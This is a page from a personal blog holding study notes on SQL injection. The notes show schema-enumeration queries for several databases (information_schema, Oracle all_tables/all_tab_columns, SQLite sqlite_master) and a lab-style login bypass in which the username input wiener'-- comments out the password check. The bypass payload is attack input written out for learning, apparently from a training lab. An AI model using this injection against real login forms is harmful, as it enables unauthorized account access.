
<p>如果只想要列名的信息可以</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> COLUMN_NAME <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;Users&#x27;</span></span><br></pre></td></tr></table></figure>



<h4 id="获取数据库表及列的信息（Oracle）"><a href="#获取数据库表及列的信息（Oracle）" class="headerlink" title="获取数据库表及列的信息（Oracle）"></a>获取数据库表及列的信息（Oracle）</h4><p>获得数据库中所有表的信息<code>all_tables</code>:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> all_tables</span><br></pre></td></tr></table></figure>

<p>获取数据库所有列的信息 <code>all_tab_columns</code>:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;USERS&#x27;</span></span><br></pre></td></tr></table></figure>



<h4 id="获取数据库表及列的信息（SQLite）"><a href="#获取数据库表及列的信息（SQLite）" class="headerlink" title="获取数据库表及列的信息（SQLite）"></a>获取数据库表及列的信息（SQLite）</h4><p>The sqlite_master table is a special table that is automatically created for every SQLite database. It looks like this:</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE sqlite_master (</span><br><span class="line">  type      TEXT,    -- either &quot;table&quot; or &quot;index&quot;</span><br><span class="line">  name      TEXT,    -- name of this table or index</span><br><span class="line">  tbl_name  TEXT,    -- for indices: name of associated table</span><br><span class="line">  sql       TEXT     -- SQL text of the original CREATE statement //创建该表的语句，可从中看到列名，故用作查找所有列的信息</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/08/11/SQL%20injection-Subverting%20application%20logic/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/08/11/SQL%20injection-Subverting%20application%20logic/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-08-11 09:10:59" itemprop="dateCreated datePublished" datetime="2021-08-11T09:10:59+08:00">2021-08-11</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-09-10 17:25:27" itemprop="dateModified" datetime="2021-09-10T17:25:27+08:00">2021-09-10</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="Subverting-application-logic"><a href="#Subverting-application-logic" class="headerlink" title="Subverting application logic"></a>Subverting application logic</h2><h4 id="scenario：（SQL）"><a href="#scenario：（SQL）" class="headerlink" title="scenario：（SQL）"></a>scenario：（SQL）</h4><p>login in通常需要username和password：（下面以 wiener~bluecheese为例）</p>
<p>login in发送的SQL请求</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;wiener&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;bluecheese&#x27;</span></span><br></pre></td></tr></table></figure>



<h4 id="goal："><a href="#goal：" class="headerlink" title="goal："></a>goal：</h4><p>通过sql 注入绕过password的输入</p>
<h4 id="solution："><a href="#solution：" class="headerlink" title="solution："></a>solution：</h4><p>username填入：wiener’–</p>
<p>即SQL请求变为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;wiener&#x27;</span><span class="comment">--&#x27; AND password = &#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>即</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;wiener&#x27;</span></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">H01iday</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  




  





</body>
</html>
